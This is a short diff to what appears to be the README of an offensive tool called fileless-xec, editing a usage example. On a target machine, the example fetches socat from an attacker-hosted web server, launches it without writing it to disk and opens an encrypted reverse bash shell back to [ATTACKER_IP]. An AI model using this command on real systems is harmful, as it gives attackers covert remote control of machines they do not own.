@@ -119,7 +119,7 @@ python3 -m http.server 8080
 
 # On target machine
 # Use already downloaded fileless-xec to download socat and stealthy launch it with argument
-fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
+fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:[SOCAT_LISTENING_PORT],verify=0
 ```
 
 ### Use dll instead of `.exe`
